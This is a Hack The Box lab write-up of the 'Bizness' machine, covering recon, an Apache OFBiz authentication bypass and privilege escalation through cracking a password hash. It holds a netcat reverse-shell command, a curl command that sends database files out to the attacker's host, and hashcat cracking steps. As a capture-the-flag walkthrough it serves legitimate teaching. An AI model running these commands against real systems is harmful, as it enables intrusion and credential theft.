---
title:  "HTB Bizness Writeup"
date:   2024-05-25 00:30:00 
categories: HTB Machine
tags: apache_ofbiz CVE-2023-51467 CVE-2023-49070 
---

![Bizness](/assets/img/Bizness/GDA3faiXQAA_He5.png)

## Introduction 

The initial access was what you would expect of an easy machine. Doing some basic enumration to then find and exploiting a known vulnerability. Getting access to root was a bit more of an obnoxious search but once you know what you have to do its trivial.

If you like any of my content it would help a lot if you used my referral link to buy Hack The Box/Academy Subscriptions which you can find on my about page.

## Initial access
### Recon

To start off our recon we will begin with an Nmap scan of the machine. Using the following command:
```
sudo nmap -sS -A  -p-  -o nmap  10.10.11.252
```
**Nmap**
```
# Nmap 7.94 scan initiated Tue Jan  9 13:48:53 2024 as: nmap -sS -A -p- -o nmap 10.10.11.252
Nmap scan report for 10.10.11.252
Host is up (0.026s latency).
Not shown: 65531 closed tcp ports (reset)
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 3e:21:d5:dc:2e:61:eb:8f:a6:3b:24:2a:b7:1c:05:d3 (RSA)
|   256 39:11:42:3f:0c:25:00:08:d7:2f:1b:51:e0:43:9d:85 (ECDSA)
|_  256 b0:6f:a0:0a:9e:df:b1:7a:49:78:86:b2:35:40:ec:95 (ED25519)
80/tcp    open  http       nginx 1.18.0
|_http-title: Did not follow redirect to https://bizness.htb/
|_http-server-header: nginx/1.18.0
443/tcp   open  ssl/http   nginx 1.18.0
|_http-server-header: nginx/1.18.0
| ssl-cert: Subject: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=UK
| Not valid before: 2023-12-14T20:03:40
|_Not valid after:  2328-11-10T20:03:40
| tls-nextprotoneg: 
|_  http/1.1
| tls-alpn: 
|_  http/1.1
|_http-title: Did not follow redirect to https://bizness.htb/
|_ssl-date: TLS randomness does not represent time
39249/tcp open  tcpwrapped
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94%E=4%D=1/9%OT=22%CT=1%CU=34590%PV=Y%DS=2%DC=T%G=Y%TM=659D954D
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)OPS(
OS:O1=M53CST11NW7%O2=M53CST11NW7%O3=M53CNNT11NW7%O4=M53CST11NW7%O5=M53CST11
OS:NW7%O6=M53CST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(
OS:R=Y%DF=Y%T=40%W=FAF0%O=M53CNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
OS:S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 995/tcp)
HOP RTT      ADDRESS
1   25.91 ms 10.10.14.1
2   27.04 ms 10.10.11.252

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Jan  9 13:49:49 2024 -- 1 IP address (1 host up) scanned in 56.97 seconds
```
When reviewing the Nmap output we can see that only the web ports and SSH are open. So the first step is to check out the web portal. Looking at the web page at first sight it looks like a static website. So we'll have to start digging a little deeper. my first guess is to do some directory brute forcing.

![Front page](/assets/img/Bizness/Bizness_01.png)

So first i ran a dirsearch, dirsearch is a great tool to get a quick lay of the land although its default wordlist isn't the biggest it often does find the more common things. This command gave us some really interesting info that there was a page located at **/control/login**

```bash
dirsearch -u https://bizness.htb
```
![Dirsearch results](/assets/img/Bizness/Bizness_02.png)

When browsing to this page we can see that its an Apache ofbiz application ERP system running here. When we look in the bottom corner we can see that version **18.12**. This version is found to be vulnerable to an authentication bypass vulnerability **CVE-2023-51467** and **CVE-2023-49070**. There is already a public exploit for this vulnerability as well. you can download it from this [github repo](https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass)


![ofbiz version](/assets/img/Bizness/Bizness_03.png)

Clone the github repo using the following command

```bash
git clone https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass.git
```

Next we run the exploit using, As command I used a reverse shell using netcat

```bash
python exploit.py --url https://bizness.htb --cmd "nc -c bash 10.10.14.225 443" 
```

After running the exploit we'll gain access to the system as user **ofbiz**

![User shell](/assets/img/Bizness/Bizness_04.png)

## Privilege escalation

For privilege escalation i started looking at the files within the file structure of the ERP solution. I then noticed that the application is using a derby database. This database saves all its content in files however all the files are chunked into small pieces. and can be found in the **/opt/ofbiz/runtime/data/derby/ofbiz/seg0**. i decided to exfiltrate the entire directory to do this i first setup a python upload server

```
python3 -m uploadserver 80
```
Next use the following Bash command to append all files into one 

```bash
cat *.dat >> combined_file
```

Then i used the following command to upload the file to my machine

do curl -X POST http://10.10.14.225/upload -F files=@combined_file


After extracting the file we can see that it sa binary file however some bits and pieces are still readable.The first low hanging fruit check i do is to check if there are any lines containing the password in the line. We can do this with the following regex using grep

```bash
grep -arin -o -E '(\w+\W+){0,5}password(\W+\w+){0,5}' .
```

This gives me the following output. We can see that there is a password hash in there on line **21318**

```
10830:SYSCS_CREATE_USEuserNampasswordVARCHAR
10830:PASSWORD&$c013800d-00fb-2649-07ec-000000134f30
10830:SYSCS_RESET_PASSWORuserNampasswordVARCHAR
10830:PASSWORD&$c013800d-00fb-2649-07ec-000000134f30
10830:SYSCS_MODIFY_PASSWORpasswordVARCHAR
10870:PASSWORD'&$c013800d-00fb-2649-07ec
10870:PASSWOR(&$c013800d-00fb-2649-07ec
10954:td align='left'><span>Password: </span></td
10957:td align='left'><input type="password" class='inputBox' name="PASSWORD" autocomplete
10972:href="<@ofbizUrl>/forgotpasswd</@ofbizUrl>">Forgot Password?</a></div
10988:if autoUserLogin?has_content>document.loginform.PASSWORD.focus();</#if
11234:Password>${password}</Password
11465:VT_CHPWD_TMPLT_LOC
VT_RES_TYPE22#!Change Password Template Location
11465:VT_FGPWD_TMPLT_LOC
VT_RES_TYPE23#!Forget Password Template Location
11554:PRDS_EMAIL
                PWD_RETRIEVE10Retrieve Password
21318:Password="$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I" enabled
<Snipped>
```

So now we have the following hash however the format we have here doesn't match any real hash formats. It must have been manipulated in one way or the other. So the next step would then be to search for how this application uses these hashes.

```
$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I
```

To figure out how the ofbiz application uses their hashes i looked up if i could find the source code online.I did find the source code on github the following code was being used to compare password - [Full code](https://github.com/apache/ofbiz/blob/trunk/framework/base/src/main/java/org/apache/ofbiz/base/crypto/HashCrypt.java). In this code we can see that the hash content is a **url safe base64 encoded string** ontop of the hex content

```java
    private static String getCryptedBytes(String hashType, String salt, byte[] bytes) {
        try {
            MessageDigest messagedigest = MessageDigest.getInstance(hashType);
            messagedigest.update(salt.getBytes(UtilIO.getUtf8()));
            messagedigest.update(bytes);
            return Base64.encodeBase64URLSafeString(messagedigest.digest()).replace('+', '.');
        } catch (NoSuchAlgorithmException e) {
            throw new GeneralRuntimeException("Error while comparing password", e);
        }
    }
```
We can reverse this process with the following cybercheff recipe.

```
From_Base64('A-Za-z0-9-_',false,false)
To_Hex('None',0/disabled)
To_Hex_Content('All chars',false)
```
![Cybercheff](/assets/img/Bizness/Bizness_05.png)

So this gives us the following hash. The **:d** is the salt we found in the hash earlier. This gives us the following hash which we can crack using hashcat.

```
b8fd3f41a541a435857a8f3e751cc3a91c174362:d
```

Running the following hascat command would show you the password is **monkeybizness**

```
hashcat -m 120 -a 0 hash /usr/share/wordlists/rockyou.txt

```
![Hashcat](/assets/img/Bizness/Bizness_06.png)


I then started to try these credentials on any account i could find. Seems i was overthinking it because this was the password of the root user. We could then log into the machine using the su command 

```
su root 
```

![Root access](/assets/img/Bizness/Bizness_07.png)
